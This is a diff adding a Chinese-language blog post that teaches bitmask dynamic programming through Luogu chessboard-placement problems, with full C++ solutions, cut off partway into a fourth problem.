@@ -167,6 +167,512 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/22/%E7%8A%B6%E5%8E%8BDP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/22/%E7%8A%B6%E5%8E%8BDP/" class="post-title-link" itemprop="url">动态规划-状压DP</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-12-22 23:48:00" itemprop="dateCreated datePublished" datetime="2022-12-22T23:48:00+08:00">2022-12-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-06-01 09:38:00" itemprop="dateModified" datetime="2023-06-01T09:38:00+08:00">2023-06-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="动态规划-状压DP"><a href="#动态规划-状压DP" class="headerlink" title="动态规划-状压DP"></a>动态规划-状压DP</h1><p>状态压缩DP,也就是把局面状态压缩到一个整数中,用整数的运算表示状态转移</p>
+<p>模板题一般是,往棋盘上放同一种棋子,并且不能让他们掐架,问题有两种:</p>
+<p>一共要放k个,求放法有几种?</p>
+<p>最多放多少个?</p>
+<p><code>g++ -std=c++11 -O2</code></p>
+<h2 id="P1896-八王八"><a href="#P1896-八王八" class="headerlink" title="P1896 八王八"></a><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1896">P1896 八王八</a></h2><p>一个$N\times N$的国象棋盘上放$k$个王八,要求这k个王八不能掐架.求有多少种放王八的方法</p>
+<p>其中$1\leq N\leq 9,0\leq k\leq N\times N$</p>
+<p>类似于八皇后问题,但是王八的攻击范围只有周围八格,更近</p>
+<h3 id="状态压缩"><a href="#状态压缩" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>棋盘的每个格子,要么有王八,要么没王八,因此 可以用1表示有,0表示无的状态</p>
+<p>那么整个棋盘可以看成有N行,每行有N个格子</p>
+<p>比如一个$4\times 4$,没有王的棋盘就可以是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br><span class="line">0 0 0 0</span><br></pre></td></tr></table></figure>
+
+<p>可以将一行压缩为一个整数,最左侧是最低位比如</p>
+<p>1 0 0 1 0 1 0 -&gt;0101001b&#x3D;41</p>
+<p>如果想让一行中的王八不掐架,那么不能有任何两个1相邻.这一点怎么判断呢?</p>
+<p>假设current_state&#x3D;41表示当前行状态</p>
+<p>那么<code>(current_state&amp;((current_state&gt;&gt;1)|current_state&lt;&lt;1))</code>就可以判断有没有王八掐架</p>
+<p>为啥呢?</p>
+<p>比如状态41显然是合法的</p>
+<table>
+<thead>
+<tr>
+<th>状态</th>
+<th>整数</th>
+<th>二进制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>current_state</td>
+<td>41</td>
+<td>0101001</td>
+</tr>
+<tr>
+<td>current_state&lt;&lt;1</td>
+<td></td>
+<td>1010010</td>
+</tr>
+<tr>
+<td>current_state&gt;&gt;1</td>
+<td></td>
+<td>0010100</td>
+</tr>
+<tr>
+<td>(current_state&lt;&lt;1)|(current_state&gt;&gt;1)</td>
+<td></td>
+<td>1010110</td>
+</tr>
+<tr>
+<td>current_state</td>
+<td></td>
+<td>0101001</td>
+</tr>
+<tr>
+<td>(current_state&amp;((current_state&gt;&gt;1)|(current_state&lt;&lt;1))</td>
+<td></td>
+<td>0000000</td>
+</tr>
+</tbody></table>
+<p>如何让相邻两行的王八不掐架呢?</p>
+<p><code>(current_state&amp;((previous_state)|(previous_state&lt;&lt;1)|(previous_state&gt;&gt;1)))</code></p>
+<p>道理类似于不让一行中的王八掐架,上一行的一个王八,那么本行中该王八的左下,正下,右下都不能有王八</p>
+<h3 id="状态转移"><a href="#状态转移" class="headerlink" title="状态转移"></a>状态转移</h3><p>设计状态:</p>
+<p><code>dp[currnet_row][cnt_king_used][current_state]</code>表示:</p>
+<p>已经安排了<code>[1,current_row]</code>的王八,</p>
+<p>已经安排了<code>cnt_king_used</code>个王八,</p>
+<p>当前行,也就是第<code>current_row</code>的状态是<code>current_state</code></p>
+<p>状态转移方程:<br>$$<br>\begin{aligned}<br>&amp;dp[current_row][cnt_king_used][current_state]&#x3D;\<br>&amp;\sum_{previous_state}dp[previous_row][cnt_kings_used-cnt_kings_of[current_row]\ ][previous_state]<br>\end{aligned}<br>$$<br>初始状态:</p>
+<p>前0行(不存在这一行),放了0个王八,状态显然是0,此时的摆放方法<code>dp[0][0][0]=0</code></p>
+<h3 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dp[<span class="number">10</span>][<span class="number">100</span>][<span class="number">2000</span>];<span class="comment">//dp[i][j][k]前i行中已经摆了j个王,其中第i行的状态是k.的数量</span></span><br><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;legal_states;</span><br><span class="line"><span class="type">int</span> cnt_kings_in_state[<span class="number">2000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isLegalState</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((k&amp;((k&lt;&lt;<span class="number">1</span>)|(k&gt;&gt;<span class="number">1</span>)))==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isInvasion</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a,<span class="type">const</span> <span class="type">int</span> &amp;b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a&amp;((b&lt;&lt;<span class="number">1</span>)|(b&gt;&gt;<span class="number">1</span>)|b));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="type">int</span> current_state;</span><br><span class="line">    <span class="type">int</span> cnt_state;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;n);i++)&#123;</span><br><span class="line">        current_state=i;</span><br><span class="line">        cnt_state=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(current_state)&#123;</span><br><span class="line">            cnt_state+=current_state&amp;<span class="number">1</span>;</span><br><span class="line">            current_state&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt_kings_in_state[i]=cnt_state;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isLegalState</span>(i))&#123;</span><br><span class="line">            legal_states.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> current_row=<span class="number">1</span>;current_row&lt;=n;current_row++)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:legal_states)&#123;<span class="comment">//当前行合法状态</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_state:legal_states)&#123;<span class="comment">//上一行的合法状态</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isInvasion</span>(current_state,previous_state)==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(</span><br><span class="line">                        <span class="type">int</span> cnt_tot_kings=cnt_kings_in_state[current_state];</span><br><span class="line">                        cnt_tot_kings&lt;=k;</span><br><span class="line">                        ++cnt_tot_kings</span><br><span class="line">                    )&#123;</span><br><span class="line">                        </span><br><span class="line">                        dp[current_row][cnt_tot_kings][current_state]+=</span><br><span class="line">                            dp[previous_row][cnt_tot_kings-cnt_kings_in_state[current_state]][previous_state];</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:legal_states)&#123;</span><br><span class="line">        result+=dp[n][k][current_state];</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="P1219-八皇后"><a href="#P1219-八皇后" class="headerlink" title="P1219 八皇后"></a><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1219">P1219 八皇后</a></h2><p>$N\times N$的棋盘上要放N的皇后,要求N个皇后不能掐架,求多少种放皇后的方法</p>
+<p>$6\leq N\leq 13$</p>
+<h3 id="状态压缩-1"><a href="#状态压缩-1" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>N行,每行N位,每位0表示没有皇后,1表示有皇后</p>
+<p>一个int有32位,足够表示一行</p>
+<p>每行的最左侧格子是int的最低位</p>
+<h3 id="状态转移-1"><a href="#状态转移-1" class="headerlink" title="状态转移"></a>状态转移</h3><p>设计状态</p>
+<p>$dfs(col_state,diagonal_state,rdiagonal_state,row)$</p>
+<p>表示当前要放第row行的皇后,</p>
+<p>之前所有的皇后控制的所有列存放在<code>col_state</code>中,</p>
+<p>之前所有皇后控制的左上到右下的斜线<strong>在本行的影响</strong>存放在<code>diagonal_state</code>中</p>
+<p>之前所有皇后控制的右上到左下的斜线在本行的影响存放在<code>人diagonal_state</code>中</p>
+<p>显然$dfs(col_state,diagonal_state,rdiagonal_state,row)$的任务就是,结合前三个参数,在本行找一个安全位置放一个皇后,然后进入下一层dfs</p>
+<p>啥意思呢?8</p>
+<p>假如现在要放第四行,前三行的皇后如图所示</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114520664.png" alt="image-20221222114520664"></p>
+<p>这三个皇后控制的列对第四行的影响如图</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114303317.png" alt="image-20221222114303317"></p>
+<p>那么此时第四行的2,4,6列就不允许放皇后,</p>
+<p>此时<code>col_state=00101010b</code>,(最左侧格子在最低位)表示第2,4,6列不允许使用</p>
+<p>前三个皇后在左上到右下的斜线上,对第四行产生的影响如图</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222114701433.png" alt="image-20221222114701433"></p>
+<p>即此时<code>diagonal_state=01110000</code>(最左侧格子在最低位),表示第5,6,7列不允许使用</p>
+<p><code>rdiagonal_state</code>同理</p>
+<p>下面考虑这三个表示占用状态的参数如何维护</p>
+<p>显然col_state最容易维护,只要第i列上有过皇后,col_state的相应二进制位就置1</p>
+<p>对于diagonal_state,假设本行的皇后放在第i列,那么他会影响下一行的i+1列,因此从当前行的dfs进入下一行的dfs时,只需要把diagonal_state加上本行的皇后列位置,然后右移1位传递给下层dfs</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222150322875.png" alt="image-20221222150322875"></p>
+<p>综上,对于当前行的dfs,放置皇后时需要考虑的因素如图:</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222150632385.png" alt="image-20221222150632385"></p>
+<p>状态转移方程采用”推”的方式,从row层推进到row+1层<br>$$<br>\begin{aligned}<br>&amp;dfs(col_state,diagonal_state,rdiagonal_state,row)\ \Rightarrow<br>&amp;dfs(col_state|current_state,(diagonal_state|current_state)&gt;&gt;1,(rdiagonal_state|current_state)&lt;&lt;1,row+1)<br>\end{aligned}<br>$$</p>
+<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">20</span>;</span><br><span class="line"><span class="type">int</span> log_2[<span class="number">10000</span>];</span><br><span class="line"><span class="type">int</span> cnt_success=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> limit_state;</span><br><span class="line"><span class="type">int</span> col[maxn];<span class="comment">//第i行放在第col[i]列上</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> &amp;x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);<span class="comment">//-x为取补,~x为按位取反</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)&#123;</span><br><span class="line">        cout&lt;&lt;col[i]<span class="number">+1</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> column_state,<span class="type">int</span> diagonal_state,<span class="type">int</span> rdiagonal_state,<span class="type">int</span> row)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(row&gt;n)&#123;</span><br><span class="line">        ++cnt_success;</span><br><span class="line">        <span class="keyword">if</span>(cnt_success&lt;=<span class="number">3</span>)&#123;<span class="comment">//打印前三个排列</span></span><br><span class="line">            <span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> capture_state=(column_state|diagonal_state|rdiagonal_state)&amp;limit_state;</span><br><span class="line">    <span class="type">int</span> available_state=(~capture_state)&amp;limit_state;<span class="comment">//~按位取反,</span></span><br><span class="line">    <span class="type">int</span> position_state;</span><br><span class="line">    <span class="type">int</span> position;</span><br><span class="line">    <span class="keyword">while</span>(available_state)&#123;</span><br><span class="line">        position_state=<span class="built_in">lowbit</span>(available_state);<span class="comment">//lowbit每次先尝试最低位,保证了得到结果的顺序是按照字典序的</span></span><br><span class="line">        position=log_2[position_state];</span><br><span class="line">        col[row]=position;</span><br><span class="line">        <span class="built_in">dfs</span>(column_state|position_state,(diagonal_state|position_state)&gt;&gt;<span class="number">1</span>,(rdiagonal_state|position_state)&lt;&lt;<span class="number">1</span>,row<span class="number">+1</span>);</span><br><span class="line">        available_state-=position_state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    limit_state=(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;<span class="comment">//规定yi&#x27;man</span></span><br><span class="line">    log_2[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;<span class="number">10000</span>;i++)&#123;<span class="comment">//初始化log_2对数函数</span></span><br><span class="line">        log_2[i]=log_2[i/<span class="number">2</span>]<span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;cnt_success&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="P1879-八将军"><a href="#P1879-八将军" class="headerlink" title="P1879 八将军"></a><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1879">P1879 八将军</a></h2><p>$M\times N$个格子的矩形地面</p>
+<p>然后输入$M\times N$个数表明这个地面是否肥沃,1肥沃,0贫瘠</p>
+<p>其中$1\leq M,N\leq 12$</p>
+<p>肥沃的土地可以种草,贫瘠的不行</p>
+<p>任何两个草地不能有相邻边,可以有相邻顶角</p>
+<p>求有多少种安排方法</p>
+<p>问题可以向八王八靠拢,如果种草地可以视为占了一个中国象棋的将军,前后左右四个格子内不允许有第二个将军.贫瘠的格子不允许放棋</p>
+<p>如果八王八问题中也有一些棋盘不允许放置棋子则和本题就很相似了</p>
+<h3 id="状态压缩-2"><a href="#状态压缩-2" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>一行最多有12个格子,每个格子要么种草,要么不中,一个二进制位两种状态表示一个格子即可,那么一行只需要12个二进制位,显然一个int有32位足够表示一行的状态</p>
+<p>贫瘠的格子如何建模?贫瘠的格子不允许种草就行了呗</p>
+<h3 id="状态转移-2"><a href="#状态转移-2" class="headerlink" title="状态转移"></a>状态转移</h3><p>类比八国王问题,设计dp状态<br>$$<br>dp[current_row][current_state]<br>$$<br>表示:</p>
+<p>已经安排了[1,current_row]行,</p>
+<p>其中第current_row行的状态是current_stata,</p>
+<p>满足上述两个条件的不同安排数目是<code>dp[current_row][current_state]</code></p>
+<p>状态转移方程是<br>$$<br>dp[current_row][current_state]&#x3D;\<br>\sum_{previous_state}dp[previous_row][previous_state]<br>$$<br>这里要求<code>previous_state</code>和<code>current_state</code>两个状态不能相互冲突,也就是上一行的种草格子,下一行这个格子不允许种草</p>
+<h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> row_base_state[maxn];<span class="comment">//输入一行土地贫瘠状态之后压缩成一个整数,row_base_state[i]表示第i行的地皮是贫瘠还是肥沃</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; row_legal_state[maxn];<span class="comment">//ro_legal_state[i]表示第i行的所有合法状态集合(同行内没有相邻草地并且考虑贫瘠土地)</span></span><br><span class="line"><span class="type">int</span> row_limit_state;<span class="comment">//行状态上限</span></span><br><span class="line"><span class="type">int</span> dp[maxn][<span class="number">1000000</span>];<span class="comment">//dp[current_row][current_state],第1到current_row行都已经安排,其中第current_row行的状态是current_state</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;<span class="comment">//m行,每行有n列</span></span><br><span class="line">    row_limit_state=(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;<span class="comment">//行状态上限</span></span><br><span class="line">    <span class="type">int</span> single_state;<span class="comment">//用于承载一个格子的状态</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;<span class="comment">//获取输入压缩到row_base_state</span></span><br><span class="line">        <span class="type">int</span> row_state=<span class="number">0</span>;<span class="comment">//用于压缩一行的状态</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            cin&gt;&gt;single_state;</span><br><span class="line">            <span class="comment">//最先输入的格子权位最高,也就是说最左侧的格子在状态的最高二进制位</span></span><br><span class="line">            row_state=row_state*<span class="number">2</span>+single_state;<span class="comment">//行状态=刚才的行状态左移一位加上新格子的状态</span></span><br><span class="line">        &#125;</span><br><span class="line">        row_base_state[i]=row_state;<span class="comment">//计算得出了第i行的压缩状态</span></span><br><span class="line">        <span class="keyword">for</span>(row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;++row_state)&#123;<span class="comment">//计算第i行的所有合法种草状态,第i行的每种合法种草状态都放到row_legal_state[i]中</span></span><br><span class="line">            <span class="keyword">if</span>((row_state&amp;((row_state&lt;&lt;<span class="number">1</span>)|(row_state&gt;&gt;<span class="number">1</span>)))==<span class="number">0</span> &amp;&amp; ((row_state&amp;((~row_base_state[i])&amp;row_limit_state))==<span class="number">0</span>))&#123;</span><br><span class="line">                row_legal_state[i].<span class="built_in">push_back</span>(row_state);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;<span class="comment">//设置dp初始条件,啥也不种的状态只有一种</span></span><br><span class="line">    row_legal_state[<span class="number">0</span>].<span class="built_in">push_back</span>(<span class="number">0</span>);<span class="comment">//第0行没有任何合法状态</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_row=<span class="number">1</span>;current_row&lt;=m;++current_row)&#123;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_row_state:row_legal_state[current_row])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_row_state:row_legal_state[previous_row])&#123;</span><br><span class="line">                <span class="keyword">if</span>((current_row_state&amp;previous_row_state)==<span class="number">0</span>)&#123;<span class="comment">//两行不能冲突</span></span><br><span class="line">                    dp[current_row][current_row_state]+=dp[previous_row][previous_row_state];<span class="comment">//状态转移</span></span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=row_limit_state;i++)&#123;</span><br><span class="line">        result=(result+dp[m][i])%mod;<span class="comment">//第m行的所有状态都要考虑在内</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="P2704-八炮兵"><a href="#P2704-八炮兵" class="headerlink" title="P2704 八炮兵"></a><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2704">P2704 八炮兵</a></h2><p>给一个P和H表示的地形地图</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/1881.png" alt="img"></p>
+<p>其中只有P(Plain,平原)格子可以放炮兵,H山地不行</p>
+<h3 id="状态压缩-3"><a href="#状态压缩-3" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>一个炮兵的打炮范围是横竖的两格相当于中象里将军腿再长一点</p>
+<p>实际上和P1879棒子地很相似了,P1879种草的方格相当于放了有一个中象的将军,这个题的格子相当于放了一个壮一点的将军</p>
+<p>原来一个将军顶多影响跟前的四个格子,现在一个炮可以影响8个格子,</p>
+<p>不妨把跟前这四个格子叫做”一级影响”,稍微远一点的四个格子叫做”二级影响”,如下图示意</p>
